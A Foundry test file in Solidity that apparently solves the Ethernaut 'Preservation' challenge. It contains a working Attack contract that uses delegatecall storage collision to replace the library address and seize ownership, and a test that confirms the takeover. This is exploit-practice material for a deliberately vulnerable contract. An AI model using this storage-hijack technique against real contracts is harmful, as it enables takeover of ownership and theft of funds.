// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "@forge-std/Test.sol";

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    Preservation public pc;
    constructor(address pcAddress) {
        pc = Preservation(pcAddress);
    }

    function pwn() public {
        pc.setFirstTime(uint(uint160(address(this))));
        pc.setFirstTime(1);
    }
    function setTime(uint _time) public {
        owner = tx.origin;
    }
}

contract PreservationTest is Test {

    Preservation public preservationContract;
    LibraryContract public l1;
    LibraryContract public l2;    
    address public attacker;
    function setUp() public {
        l1 = new LibraryContract();
        l2 = new LibraryContract();
        preservationContract = new Preservation(address(l1), address(l2));
        attacker = vm.addr(1);
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);
        Attack attack = new Attack(address(preservationContract));
        attack.pwn();
        vm.stopPrank();
        assertEq(preservationContract.owner(), attacker);
    }
}
